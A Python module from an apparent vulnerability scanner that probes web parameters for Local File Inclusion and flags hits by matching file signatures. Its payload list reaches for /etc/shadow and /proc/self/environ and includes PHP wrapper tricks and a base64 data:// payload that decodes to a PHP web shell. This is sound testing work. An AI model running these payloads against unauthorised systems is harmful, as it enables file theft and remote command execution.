"""
modules/lfi.py — Local File Inclusion detection
Tests file param names with traversal payloads including encoding bypasses.
"""
from core.http import fetch

LFI_PARAMS = [
    "file", "path", "page", "template", "view", "include",
    "doc", "document", "folder", "root", "pg", "style",
    "pdf", "lang", "locale", "f", "config", "conf",
    "load", "read", "content", "download", "filepath",
]

LFI_PAYLOADS = [
    # Linux
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    # Windows
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    # URL encoded
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2Fetc%2Fshadow",
    # Double URL encoded
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    # Null byte
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    # Longer traversal chains
    "../../../../../../../../../../etc/passwd",
    "/etc/passwd",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "root:!:",
    "daemon:",
    "bin/bash",
    "bin/sh",
    "[fonts]",         # win.ini
    "[extensions]",    # win.ini
    "for 16-bit app support",
    "/proc/version",
    "linux version",
    "HTTP_USER_AGENT",  # proc/self/environ
]


def generate_tasks(url, config):
    tasks = []
    # Respect config overrides
    extra_params = config.get("lfi", {}).get("params", [])
    all_params = list(dict.fromkeys(LFI_PARAMS + extra_params))
    payload_limit = config.get("lfi", {}).get("payload_limit", len(LFI_PAYLOADS))

    for param in all_params:
        for payload in LFI_PAYLOADS[:payload_limit]:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: payload},
                "type": "Local File Inclusion",
                "lfi_param": param,
                "executor": test_lfi,
            })
    return tasks


async def test_lfi(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"])
        if resp and text:
            low = text.lower()
            matched = [sig for sig in LFI_SIGNATURES if sig.lower() in low]
            vulnerable = len(matched) > 0
            return {
                "type": "Local File Inclusion",
                "url": task["url"],
                "params": task["params"],
                "vulnerable": vulnerable,
                "severity": "High" if vulnerable else "Info",
                "evidence": matched,
                "response": text[:500],
                "owasp_category": "A05:2021 – Security Misconfiguration",
            }
    except Exception as exc:
        return {"type": "Local File Inclusion", "url": task["url"], "error": str(exc), "vulnerable": False}
    return {"type": "Local File Inclusion", "url": task["url"], "vulnerable": False}
